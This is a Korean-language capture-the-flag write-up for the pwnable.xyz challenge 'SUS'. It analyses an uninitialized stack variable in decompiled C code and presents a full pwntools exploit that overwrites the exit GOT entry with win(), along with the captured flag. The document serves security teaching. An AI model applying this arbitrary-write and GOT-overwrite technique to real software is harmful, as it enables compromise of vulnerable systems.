# [pwnable.xyz] SUS

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Single User Storage
>
> Release: [SUS.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8950622/SUS.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174847915-40ca6199-5c58-4d16-80c3-ec5bd1180a13.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

#### 1. Create user

```c
      if ( op != 1 )
        break;
      create_user();
```

```c
unsigned __int64 create_user()
{
  void *name; // [rsp+0h] [rbp-1060h] BYREF
  unsigned __int64 v2; // [rsp+1058h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !name )
  {
    name = malloc(0x20uLL);
    memset(name, 0, 0x20uLL);
  }
  printf("Name: ");
  read(0, name, 0x20uLL);
  printf("Age: ");
  read_int32("Age: ", name);
  cur = (__int64)&name;
  return __readfsqword(0x28u) ^ v2;
}
```

스택 프레임에서 `name`의 값이 쓰레기값이 아니라 `0`이면 `0x20`바이트만큼 메모리를 할당하고 문자열을 입력받는다. 그 다음에 `age`를 입력받는데, 디컴파일된 코드에는 표현이 되어 있지 않지만 어셈블리로 보면 `rsp-0x1018`에 들어가는 것을 확인할 수 있다. 전역 변수 `cur`에는 `name`의 주소(스택의 주소), 즉 실제 이름의 이중 포인터가 들어간다.

#### 2. Print user

```c
    if ( op == 2 )
    {
      print_user();
    }
```

```c
int print_user()
{
  int result; // eax

  result = cur;
  if ( cur )
  {
    printf("User: %s\n", *(const char **)cur);
    return printf("Age: %d\n", *(unsigned int *)(cur + 0x48));
  }
  return result;
}
```

`create_user()`에서 `cur`에 실제 이름의 이중 포인터를 저장한다. `cur`에 값이 존재하면 포인터를 따라가서 이름과 나이를 출력한다.

#### 3. Edit user

```c
    else if ( op == 3 )
    {
      edit_usr();
    }
```

```c
unsigned __int64 edit_usr()
{
  __int64 v0; // rbx
  unsigned __int64 v2; // [rsp+1018h] [rbp-18h]

  v2 = __readfsqword(0x28u);
  if ( cur )
  {
    printf("Name: ");
    read(0, *(void **)cur, 0x20uLL);
    printf("Age: ");
    v0 = cur;
    *(_DWORD *)(v0 + 0x48) = read_int32();
  }
  return __readfsqword(0x28u) ^ v2;
}
```

`print_user()`과 마찬가지로 `cur`에 저장된 포인터를 따라가서 이름과 나이를 수정할 수 있다.

## Exploit

`create_user()`에서 `name`과 `age`는 모두 스택에 저장되는데, 스택 프레임이 정리되고 나면 이 값들이 유지된다는 보장이 없다.

`name`에 `"AAAAAAAA"`, `age`에 `0xdeadbeef`(`3735928559`)를 넣은 직후에 스택의 상태는 다음과 같다.

![image](https://user-images.githubusercontent.com/104156058/174865950-8ddc279d-543a-4feb-960f-3832b2d7976d.png)

그 다음에 `edit_usr()`를 실행하면 내부적으로 `read_int32()`를 호출하여 `age`를 입력받는데,

![image](https://user-images.githubusercontent.com/104156058/174866367-a3b39674-e26e-449e-bccb-d75291a46eae.png)

입력을 받을 때 `rsp+0x10`에 있는 `name` 청크의 주소를 덮어쓸 수 있는 것을 확인할 수 있다. 여기에 임의의 주소를 넣고, 다음에 `edit_usr()`를 한 번 더 실행해서 그 주소에 임의의 값을 쓸 수 있다.

`exit()`의 GOT를 `win()`의 주소로 덮어쓰고, 60초가 지나서 timeout으로 `handler()`가 실행되면 그 내부에서 `exit()`이 호출되어 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30011)

sla = r.sendlineafter
sa = r.sendafter

def create_user(name, age):
    sla('> ', '1')
    sa('Name: ', name)
    sla('Age: ', age)

def print_user():
    sla('> ', '2')

def edit_user(name, age):
    sla('> ', '3')
    sa('Name: ', name)
    sla('Age: ', age)

win = 0x400b71
exit_got = 0x602070

create_user('a', '1')
edit_user('a', b'1' + b'a' * 0xf + p64(exit_got))
edit_user(p64(win), '1')

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30011: Done
[*] Switching to interactive mode
Menu:
1. Create user.
2. Print user.
3. Edit user.
4. Exit.
> FLAG{uninitializ3d_variabl3_ch3ck3d}
```
